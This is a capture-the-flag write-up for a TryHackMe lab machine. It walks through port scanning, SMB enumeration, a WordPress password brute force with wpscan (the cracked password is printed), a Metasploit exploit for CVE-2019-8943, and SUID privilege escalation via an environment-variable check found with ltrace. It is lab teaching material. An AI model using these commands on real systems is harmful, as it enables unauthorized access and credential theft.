# 35 - Anonymous (ltrace / strace) to enumerate SUID binaries

Room Link --> [https://tryhackme.com/room/blog](https://tryhackme.com/room/blog)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -Pn -n -T5 -p- -sS -vv 10.10.37.166

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```
{% endcode %}

_In order to get the blog to work with AWS, you'll need to add "blog.thm" to your /etc/hosts file._

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Checking the Page source code we get 2 usernames : Billy and his Mom.

```
bjoel
kwheel
```

#### SMB enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
smbmap -H blog.thm -u 'anonymous' -p 'anonymous'

print$       NO ACCESS	  Printer Drivers
BillySMB     READ, WRITE  Billy's local SMB Share
IPC$         NO ACCESS	  IPC Service (blog server (Samba, Ubuntu))

# we have RW access to the "BillySMB" share.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The images from the SMB file share were deadends, so since we have 2 usernames we can use wpscan to bruteforce for their login passwords.

#### wpscan

{% code overflow="wrap" lineNumbers="true" %}
```bash
wpscan --url http://blog.thm/wp-login.php --usernames kwheel --passwords /usr/share/wordlists/rockyou.txt
```
{% endcode %}

the WPScan was able to extract the credentials for the user kwheel. It was cutiepie1.

<figure><img src="https://i0.wp.com/1.bp.blogspot.com/-fSRqKS33MB0/YKpXlw6DvqI/AAAAAAAAwBQ/8QSDhRQU65UJ8Eacc_bn5fMs_ovxxMg7gCLcBGAsYHQ/s16000/8.png?w=640&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

`kwheel : cutiepie1` .

Login to  wordpress. `version 5.0` .

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*rf2EDb3asLwEe5Fp4OqnmQ.png" alt="" height="82" width="700"><figcaption></figcaption></figure>

There is an [exploit](https://www.exploit-db.com/exploits/49512) for uploading images for WordPress Core 5.0 (CVE-2019–8943). we also have a Metasploit Module for this.

`use exploit/multi/http/wp_crop_rce`&#x20;

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

`find / -perm -u=s -type f 2>/dev/null` .

<figure><img src="https://i0.wp.com/1.bp.blogspot.com/-9PLookrmx8E/YKpX7cj9jFI/AAAAAAAAwBw/c3_Wk84j9EgjlSvl15M80WrmYu0nLkkzwCLcBGAsYHQ/s16000/12.png?w=640&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

Running `strings /usr/sbin/checker` - and we see it is executing `/bin/bash`.&#x20;

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Running the file informs us that we are not admin users.

> /usr/sbin/checker

<figure><img src="https://miro.medium.com/v2/resize:fit:217/1*W8OiYcQCx1PqN2r6GHsdqg.png" alt="" height="71" width="316"><figcaption></figcaption></figure>

We can investigate the binary more by using either **strace** or **ltrace** as both is installed on the host.

> ltrace /usr/sbin/checker

<figure><img src="https://miro.medium.com/v2/resize:fit:349/1*JYG2x8FV2Vv_iMG56RvN0Q.png" alt="" height="82" width="508"><figcaption></figcaption></figure>

Based on the ltrace output it appears that the only check the application does is to check an environment variable called admin for a value, lets test this theory by adding a value to the admin environmental variable

> export admin=1

Now lets launch the ltrace process to check if we are successful.

> ltrace /usr/sbin/checker

<figure><img src="https://miro.medium.com/v2/resize:fit:343/1*71tMuxVEaDu6aVyde052Cw.png" alt="" height="64" width="499"><figcaption></figcaption></figure>

We can now see that the “admin” environment variable has a value of 1.

> /usr/sbin/checker

<figure><img src="https://miro.medium.com/v2/resize:fit:312/1*pSzfFiJddbjxEsF6zANgaA.png" alt="" height="103" width="454"><figcaption></figcaption></figure>

Done!

